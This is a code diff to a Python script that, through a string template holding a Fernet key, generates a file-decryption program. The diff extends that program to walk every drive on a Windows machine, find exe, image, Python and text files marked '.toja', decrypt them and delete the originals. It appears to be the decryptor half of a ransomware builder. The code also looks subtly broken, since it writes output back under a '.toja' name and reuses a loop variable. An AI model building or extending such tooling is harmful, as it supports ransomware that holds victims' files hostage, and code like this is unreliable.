@@ -13,17 +13,29 @@ from subprocess import check_output
 
 de = Fernet(%s)
 
-cmd = check_output("D: && dir /S /B *.txt.toja",shell=True).decode().split()
+drive = ["D:","H:","S:","X:","G:","C:","F:","E:"]
+target_drive = []
+cmd = check_output("fsutil fsinfo drives",shell=True)
+for i in drive:
+    if i in str(cmd):
+        target_drive.append(i)
 
-for i in cmd:
-    with open(i,'rb') as f:
-        p = f.read()
-        m = de.decrypt(p)
-        with open(i+".toja",'wb') as u:
-            u.write(m)
-        u.close()
-        f.close()
-        os.remove(i)
+pasvand = ["exe","png","jpg","jpeg","psd","py","txt"]
+for d in target_drive:
+    for p in pasvand:
+        try:
+            cmd = check_output(d+" && dir /S /B *."+p+".toja",shell=True).decode().split()
+            for i in cmd:
+                with open(i,'rb') as f:
+                    p = f.read()
+                m = de.decrypt(p)
+                with open(i+".toja",'wb') as u:
+                    u.write(m)
+                u.close()
+                f.close()
+                os.remove(i)
+        except:
+            pass
 
 '''%(key))
 
